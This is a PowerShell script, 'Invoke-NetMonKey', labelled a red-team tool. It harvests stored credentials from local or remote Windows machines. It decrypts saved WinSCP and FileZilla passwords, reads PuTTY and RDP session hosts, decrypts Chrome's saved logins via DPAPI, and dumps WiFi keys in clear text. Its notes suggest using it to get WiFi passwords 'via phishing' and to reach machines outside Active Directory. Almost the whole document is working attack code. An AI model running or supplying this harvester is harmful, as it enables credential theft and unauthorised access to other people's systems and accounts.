<#
start-process https://github.com/Arvanaghi/SessionGopher
#>

<#
.Synopsis
   Eat Bananas
   Find Keys  
   Save Princess...

.DESCRIPTION
   This PoSh MonKey will gather as much Stuff as he can... Local & remote
   Searches Putty|WinSCP|FileZilla for hostname|username + password if possible
   Searches RDP sessions for Hostnames
   Searches Chrome browser for Saved Creds
   Searches WiFi networks for names & passwords
    
.EXAMPLE
   Invoke-NetMonkey

   Description
   -----------
   Will Search for all on LocalHost
   
   Alt.
   ----
   MonKey
   MK

.EXAMPLE
   Invoke-NetMonkey -ComputerName PC01

   Description
   -----------
   Will Search for all on target PC01
   ComputerName accepts multiple input and pipeline input (strings)

   Alt.
   ----
   MonKey -Target PC01
   MK -T PC01
   MK PC01
   'PC01' | MonKey

.EXAMPLE
   Invoke-Monkey -skip RDP

   Description
   -----------
   Will search All except RDP

   Alt.
   ----
   Monkey -Except RDP
   MK -X RDP

.EXAMPLE
   Invoke-Monkey -search WiFi

   Description
   -----------
   Will search for WiFi Networks and Passwords

   Alt.
   ----
   Monkey -search WiFi
   MK -S WiFi

.EXAMPLE
   Invoke-NetMonkey -Search Putty,WinSCP

   Description
   -----------
   Will search only for Putty and WinSCP

   Alt.
   ----
   Monkey -Only Putty,WinSCP
   MK -O Putty,WinSCP

.EXAMPLE
   Invoke-NetMonkey -UserName Bob -Password P4ssw0rd

   Description
   -----------
   Will use specified credentials for remote queries 

   Alt.
   ----
   MonKey -Name Bob -PWD P4ssw0rd 
   MK -N Bob -PW P4ssw0rd
   MK -U BoB -P P4ssw0rd

   Note
   ----
   MonKey -PWD P4ssw0rd  
   Defaults to current user & specified Password for Creds

.EXAMPLE
   'PC01','PC02','PC03' | Invoke-NetMonkey | Export-CSV MyMonKey.csv

   Description
   -----------
   Will Search on all 3 targets
   Export info to specified csv file

   Alt.
   ----
   'PC01','PC02','PC03' | Monkey | Export-CSV MyMonKey.csv
    MK 'PC01','PC02','PC03' | epcsv MyMonKey.csv

　
.EXAMPLE
   Get-Content $File | Invoke-NetMonkey -UserName Bob -Password P4ssw0rd -Skip WinSCP | Export-CSV MyMonKey.csv

   Description
   -----------
   Will get list of targets from a text $file
   Search all except WinSCP, using specified creds
   Export info to specified csv file

   Alt.
   ----
   cat $File | Monkey -Name Bob -Pwd P4ssw0rd -Except WinSCP | Export-CSV MyMonKey.csv
   gc $File | MK -N Bob -P P4ssw0rd -X WinSCP | epcsv MyMonKey.csv

.EXAMPLE
   Invoke-NetMonkey | select-Object -property * | Format-Table

   Description
   -----------
   Not all info in default object display
   Use '| Select *' to display complete object
   
   Alt.
   ----
   Monkey | select-object * | ft
   MK | select * | ft

.INPUTS
   Accepts list of targets as input (strings)

.OUTPUTS
   Outputs a custom PS Object (Pipe to Out-GridView / Export-CSV)

.NOTES
   # Requires PSremoting enabled to query remote Targets
   
   # Accepts multiple targets (+ pipeline input)
   
   # Will use current user as UserName if -Password supplied without -UserName switch
   
   # Implicit -Search 'All', use -Search or -Skip to fine tune
      See Examples for details

   # Based on existing tools:
      > SessionGopher by Brandon Arvanaghi
      > ChromeCreds by @sekirkity
      > Get-WLAN-Keys by Nikhil Mital
      > NetMonKey is just a fancy Wrapper  

.COMPONENT
   RedTeam Tool

.ROLE
   PoSh Net MonKey by SadProcessor

.FUNCTIONALITY
   This Utility can be used to aquire wifi passwords (example: via phishing)
   Gain knowledge/Access of machines outside of Active Directory (example: Linux connected via Putty/WinSCP/FileZilla)
   Dump Info out of browser 'remember for this site' (example: connection to web interfaces)

#>
function Invoke-NetMonKey{
    [Alias('MonKey','MK')]
    Param(
        # Optional Target Computer(s) | Accepts Pipeline Input (List of Targets) | Defaults to local host
        [Parameter(Position=0,Mandatory=$false,ValueFromPipeline=$true)][Alias('CN','C','Target','T')][String[]]$ComputerName = $env:ComputerName,
        # Optional Search what? | Accepts multiple set values | Defaults to All 
        [ValidateSet('Putty','WinSCP','RDP','FileZilla','Chrome','WiFi','All')]
        [Parameter(Mandatory=$false)][Alias('S','Only','O')][String[]]$Search='All',
        # Optional Skip what? | Accepts multiple set values | No skip by default
        [ValidateSet('Putty','WinSCP','RDP','FileZilla','Chrome','WiFi')]
        [Parameter(Mandatory=$false)][Alias('Except','X')][String[]]$Skip,
        # Optional UserName | Defaults to Current env UserName
        [Parameter(Mandatory=$false)][Alias('U','N','Name')][String]$UserName = $env:USERNAME,
        # Optional Password | Uses current username if password provided without -UserName switch and input
        [Parameter(Mandatory=$false)][Alias('P','PW','PWD')][String]$Password
    )
    
    ##PREP
    Begin{
        
        # Search to bool
        $SearchPutty = $SearchWinSCP = $SearchRDP = $SearchFileZilla = $SearchChrome = $SearchWiFi = $false
        switch ($Search){
            'All'       {$SearchPutty = $SearchWinSCP = $SearchRDP = $SearchFileZilla = $SearchChrome = $SearchWiFi = $True}
            'Putty'     {$SearchPutty = $true}
            'WinSCP'    {$SearchWinSCP = $true}
            'RDP'       {$SearchRDP = $true}
            'FileZilla' {$SearchFileZilla = $true}
            'Chrome'    {$SearchChrome = $true}
            'WiFi'      {$SearchWiFi = $true}
            }       
        
        # Skip to bool
        switch ($Skip){
            'Putty'     {$SearchPutty = $false}
            'WinSCP'    {$SearchWinSCP = $false}
            'RDP'       {$SearchRDP = $false}
            'FileZilla' {$SearchFileZilla = $false}
            'Chrome'    {$SearchChrome = $false}
            'WiFi'      {$SearchWiFi = $false}
            }
        
        # Prep Empty Obj collection
        $Result = @()
        
        # Def Common Vars
        # Value for HKEY_USERS hive
        $HKU = 2147483651
        # Value for HKEY_LOCAL_MACHINE hive
        $HKLM = 2147483650
               
        # If password | create creds (current user if no username input)
        $Creds = @{}
        if($Password){
            $Creds['Credential'] = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$(ConvertTo-SecureString $Password -AsPlainText -Force)
            }

        # localhost IP
        $IPLoc = (Get-NetIPAddress | where {$_.AddressFamily -eq 'IPv4' -and $_.IPaddress -ne '127.0.0.1'}).IPAddress
        
        ## SUBS
        function DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password){
            function DecryptNextCharacterWinSCP($remainingPass){
                # Creates an object with flag and remainingPass properties
                $flagAndPass = "" | Select-Object -Property flag,remainingPass
                # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
                $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
                $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
                $Added = $firstval + $secondval
                $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
                $flagAndPass.flag = $decryptedResult
                $flagAndPass.remainingPass = $remainingPass.Substring(2)
                return $flagAndPass
                }
            $CheckFlag = 255
            $Magic = 163
            $len = 0
            $key =  $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP($Password)
            $storedFlag = $values.flag 
            if($values.flag -eq $CheckFlag){
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP($values.remainingPass)
                }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP($values.remainingPass)
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i=0; $i -lt $len; $i++) {
                $values = (DecryptNextCharacterWinSCP($values.remainingPass))
                $finalOutput += [char]$values.flag
                }
            if($storedFlag -eq $CheckFlag) {return $finalOutput.Substring($key.length)}
            return $finalOutput
            } 
        }

    ##ACTION
    Process{#(pipeline obj entry)
        # For Each Computer in ComputerName 
        foreach($Computer in $ComputerName){
            
            ## Prep Vars            
            #localhost names to env:Computername
            If($Computer -in 'LocalHost','.',$IPLoc,'127.0.0.1'){$Computer = $env:ComputerName}
            
            # Bool LocalQuery
            if($Computer -eq $env:ComputerName){$LocalQuery = $true}
            Else{$LocalQuery = $false}
            

            ## Get User SID
            # Query Filter
            $Filter = "LocalAccount=$True AND Lockout=$false AND Status='OK'"
          
            # Query Local/Remote
            If($LocalQuery -eq $true){$SIDS = Try{Get-WmiObject -Class Win32_UserAccount -Filter $Filter |
                                    Where {($_.SID -match 'S-1-5-21-[\d\-]+$')} | 
                                    Select -Property Caption,Domain,Name,SID
                                    }Catch{}}
            Else{$SIDS = Try{Get-WmiObject -Class Win32_UserAccount -Filter $Filter -ComputerName $Computer @Creds | 
                         Where {($_.SID -match 'S-1-5-21-[\d\-]+$')} | 
                         Select -Property Caption,Domain,Name,SID
                         }Catch{}}
            

            ## If Obj Found
            If($SIDS){
                
                #Foreach in UserList
                Foreach($User in $SIDS){
                    
                    ## PUTTY
                    if($SearchPutty){ 
                        $Path = $User.SID + "\SOFTWARE\SimonTatham\PuTTY\Sessions"
                        If($LocalQuery -eq $true){$Sessions = Invoke-WmiMethod -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$Path}
                        Else{$Sessions = Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$Path @Creds}
                        
                        If($Sessions.ReturnValue -eq 0){
                            foreach($Connection in $Sessions.sNames){
                                # Prep Object
                                $ConnectionObj = 0 | select Caption,SID,Type,Connection,Host,User,Password
                                # Set Props
                                $ConnectionObj.Caption = $User.Caption
                                $ConnectionObj.SID = $User.SID
                                $ConnectionObj.Type = 'Putty'
                                $ConnectionObj.Connection = $Connection

                                $Location = "$Path\$Connection"
                                If($LocalQuery -eq $true){$ConnectionObj.Host= (Invoke-WmiMethod -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName").sValue}
                                Else{$ConnectionObj.Host = (Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @Creds).sValue}
                                # Add Connection Obj to Result
                                $Result += $ConnectionObj
                                }
                            }
                        }
                    
                    ## WINSCP
                    if($SearchWinSCP){
                        $Path = $User.SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
                        If($LocalQuery -eq $true){$Sessions = Invoke-WmiMethod -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$Path}
                        Else{$Sessions = Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$Path @Creds}

                        If($Sessions.ReturnValue -eq 0){
                            foreach($Connection in ($Sessions.sNames -ne 'Default%20Settings')){
                                # Prep Object
                                $ConnectionObj = 0 | select Caption,SID,Type,Connection,Host,User,Password
                                # Set Props
                                $ConnectionObj.Caption = $User.Caption
                                $ConnectionObj.SID = $User.SID
                                $ConnectionObj.Type = 'WinSCP'
                                $ConnectionObj.Connection = $Connection

                                #Query Connection Info
                                $Location = "$Path\$Connection"
                                If($LocalQuery -eq $true){
                                    $ConnectionObj.Host = (Invoke-WmiMethod -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName").sValue
                                    $ConnectionObj.User = (Invoke-WmiMethod -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserName").sValue
                                    $ConnectionObj.Password = (Invoke-WmiMethod -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"Password").sValue
                                    }
                                Else{
                                    $ConnectionObj.Host = (Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"HostName" @Creds).sValue
                                    $ConnectionObj.User = (Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserName" @Creds).sValue
                                    $ConnectionObj.Password = (Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"Password" @Creds).sValue
                                    }
                                
                                #If Password: Decrypt
                                if($ConnectionObj.Password){
                                        $PassPath = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
                                        If($LocalQuery -eq $true){$MasterPass = (Invoke-WmiMethod -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$PassPath,"UseMasterPassword").uValue}
                                        Else{$MasterPass = (Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$PassPath,"UseMasterPassword" @Creds).uValue}
                                        if(!$MasterPass){$ConnectionObj.Password = (DecryptWinSCPPassword $ConnectionObj.Host $ConnectionObj.User $ConnectionObj.Password)} 
                                        else {$ConnectionObj.Password = "X_MASTER_X"}
                                        }
                                
                                # Add Connection Obj to Result
                                $Result += $ConnectionObj
                                }
                            }
                        }
                    
                    ## RDP
                    if($SearchRDP){
                        $Path = $User.SID + "\SOFTWARE\Microsoft\Terminal Server Client\Servers"
                        If($LocalQuery -eq $true){$Sessions = Invoke-WmiMethod -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$Path}
                        Else{$Sessions = Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$Path @Creds}
                        
                        If($Sessions.ReturnValue -eq 0){
                            foreach($Connection in $Sessions.sNames){
                                # Prep Object
                                $ConnectionObj = 0 | select Caption,SID,Type,Connection,Host,User,Password
                                # Set Props
                                $ConnectionObj.Caption = $User.Caption
                                $ConnectionObj.SID = $User.SID
                                $ConnectionObj.Type = 'RDP'
                                $ConnectionObj.Connection = $Connection
                                $ConnectionObj.Host = $Connection

                                $Location = "$Path\$Connection"
                                If($LocalQuery -eq $true){$ConnectionObj.User = (Invoke-WmiMethod -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserNameHint").sValue}
                                Else{$ConnectionObj.User = (Invoke-WmiMethod -ComputerName $Computer -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$Location,"UserNameHint" @Creds).sValue}
                                # Add Connection Obj to Result
                                $Result += $ConnectionObj
                                }
                            }
                        }
                    
                    ## FILEZILLA
                    if($SearchFileZilla){
                        # Vars
                        $U = $User.Name
                        $XML = $Null
                        $Filter =  "Drive='C:' AND Path='\\Users\\$U\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
                        # Query
                        If($LocalQuery -eq $true){
                            $Path = (Get-WmiObject -Class 'CIM_DataFile' -Filter $Filter | Select Name).name
                            if($Path){[xml]$XML = Get-Content "$Path"}
                            }
                        Else{
                            $Path = (Get-WmiObject -Class 'CIM_DataFile' -Filter $Filter -ComputerName $Computer @Creds | Select Name).name
                            if($Path){[xml]$XML = invoke-command -scriptBlock {Param($P);Get-Content -path "$P"} -ArgumentList $Path -ComputerName $Computer @Creds}
                            }
                        # If XML
                        If($XML){
                            foreach($NodeList in $XML.SelectNodes('//FileZilla3/Servers/Server')){
                                # Prep Obj
                                $ConnectionObj = 0 | select Caption,SID,Type,Connection,Host,User,Password
                                # Set Props
                                $ConnectionObj.Caption = $User.Caption
                                $ConnectionObj.SID = $User.SID
                                $ConnectionObj.Type = 'FileZilla'
                                $ConnectionObj.Connection = $NodeList.Name
                                $ConnectionObj.Host = $NodeList.Host
                                $ConnectionObj.User = $NodeList.User
                                $Password = $NodeList.Pass.childNodes.InnerText
                                IF($Password){
                                    $ConnectionObj.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Password))
                                    }
                                # Add to results
                                $Result += $ConnectionObj
                                }
                            }
                        }
                    
                    ## CHROME
                    if($SearchChrome){
                        $ChromeStuff = $Null
                        $Scriptblock = {
		                    $Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
	                        #If Path doesnt exist 
                            if(![system.io.file]::Exists($Path)){Break}
                            Else{
	                            Add-Type -AssemblyName System.Security
	                            # Credit to Matt Graber for his technique on using regular expressions to search for binary data
	                            $Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	                            $Encoding = [system.Text.Encoding]::GetEncoding(28591)
	                            $StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	                            $BinaryText = $StreamReader.ReadToEnd()
	                            $StreamReader.Close()
	                            $Stream.Close()

	                            # First the magic bytes for the password. Ends using the "http" for the next entry.
	                            $PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70)'
	                            $PwdMatches = $PwdRegex.Matches($BinaryText)
	                            $PwdNum = 0
	                            $DecPwdArray = @()

	                            # Decrypt the password macthes and put them in an array
	                            Foreach ($Pwd in $PwdMatches) {
		                            $Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum])
		                            $Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		                            $DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt)
		                            $DecPwdArray += $DecPwd
		                            $PwdNum += 1
	                                }
                                

	                            # Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
	                            $UserRegex = [Regex] '(?<=\x0D\x0D\x0D\x08\x08)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	                            $UserMatches = $UserRegex.Matches($BinaryText)
	                            $UserNum = 0
	                            $UserArray = @()
	
	                            # Put the URL/User matches into an array
	                            Foreach ($User in $UserMatches) {
		                            $User = $Encoding.GetBytes($UserMatches[$UserNum])
		                            $UserString = [System.Text.Encoding]::Default.GetString($User)
		                            $UserArray += $UserString
		                            $UserNum += 1
	                                }

	                            # Now create an object to store the previously created arrays
	                            # I wasn't able to split up the URL/Username, but should be pretty easy to distinguish
	                            # To view the entire User/URL field, use Get-ChromeCreds | Select-Object -ExpandProperty "UserURL"
	                            $ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	                            for ($i = 0; $i -lt $UserNum; $i++) {
		                            $ObjectProp = @{
			                            Password = $DecPwdArray[$i]
			                            UserURL = $UserArray[$i]
		                                }
	
		                            $obj = New-Object PSObject -Property $ObjectProp
		                            $ArrayFinal.Add($obj) | Out-Null
		                            }
	                            $ArrayFinal
                                }
                            }
                        
                        If($LocalQuery -eq $true){$ChromeStuff = &$Scriptblock}
                        Else{$ChromeStuff = invoke-command -scriptBlock $ScriptBlock -ComputerName $Computer @Creds}
                        if($ChromeStuff){
                            foreach($Stuff in $ChromeStuff){
                                # Prep Obj
                                $ConnectionObj = 0 | select Caption,SID,Type,Connection,Host,User,Password
                                # Set Props
                                $ConnectionObj.Caption = $User.Caption
                                $ConnectionObj.SID = $User.SID
                                $ConnectionObj.Type = 'Chrome'
                                $ConnectionObj.Connection = $Stuff.UserUrl.replace('.srf','|').split('|')[0]
                                $ConnectionObj.Host = $Stuff.UserUrl.replace('.srf','|').split('|')[0]
                                try{$ConnectionObj.User = $Stuff.UserUrl.replace('.srf','|').split('|')[2].replace('fmt','|').split('|')[1].replace('passwd','')}catch{}
                                $ConnectionObj.Password = $Stuff.Password
                                # Add to results
                                $Result += $ConnectionObj
                                }
                            }
                        }
                    
                    ## WIFI
                    if($SearchWiFi){
                        $WiFiKeys = @()
                        $ScriptBlock = {
                            $WiFiKeys = @()
                            $wlan = netsh wlan show profiles | Select-String "All User Profile" |% {$_.ToString()}
                            $wlan = $wlan |% {If($_ -match '(?<=: ).*'){$Matches.Values}}
                            $wlan |% {
                                $SSID = $PWD = $Null
                                $Block = netsh wlan show profiles name="$_" key=clear
                                If(($Block | select-string -Pattern "SSID name") -match '(?<=: ).*'){
                                    $SSID = $Matches.Values.trim('"')
                                    if(($Block | select-string -Pattern "Key Content") -match '(?<=: ).*'){$PWD = $Matches.Values}
                                    }
                                $Obj = New-Object PSCustomObject -Property @{'SSID'="$SSID";'PWD'="$PWD"}
                                if($Obj.SSID -ne '' ){$WiFiKeys += $Obj}
                                }
                            return $WiFiKeys
                            }
                        
                        If($LocalQuery -eq $true){$WiFiKeys = &$Scriptblock}
                        Else{$WiFiKeys = invoke-command -scriptBlock $ScriptBlock -ComputerName $Computer @Creds}
                        
                        
                        if($WiFiKeys){
                            Foreach($Stuff in $WifiKeys){
                                # Prep Obj
                                $ConnectionObj = 0 | select Caption,SID,Type,Connection,Host,User,Password
                                # Set Props
                                $ConnectionObj.Caption = $User.Caption
                                $ConnectionObj.SID = $User.SID
                                $ConnectionObj.Type = 'Wifi'
                                $ConnectionObj.Connection = $Stuff.SSID
                                $ConnectionObj.Host = $Stuff.SSID
                                $ConnectionObj.User = ''
                                $ConnectionObj.Password = $Stuff.PWD   
                                # Add to results
                                $Result += $ConnectionObj                      
                                }
                            } 
                        }
                    }
                }
            }
        }
    
    ##FINISH
    End{
        ## Default Format ( ... | select * >> display full object)
        # default display set
        $defaultDisplaySet = 'Type','Host','User','Password'
        # default property display set
        $defaultDisplayPropertySet = New-Object System.Management.Automation.PSPropertySet(‘DefaultDisplayPropertySet’,[string[]]$defaultDisplaySet)
        $PSStandardMembers = [System.Management.Automation.PSMemberInfo[]]@($defaultDisplayPropertySet)
        #Give Result typename
        $Result.PSObject.TypeNames.Insert(0,'User.Information')
        $Result | Add-Member MemberSet PSStandardMembers $PSStandardMembers
        
        #Return Object
        Return $Result
        }
    
    }##ENDFUNCTION
 


<#

# Filezilla
Invoke-NetMonKey -Search FileZilla

# WinSCP
Invoke-NetMonKey -Search WinSCP

#>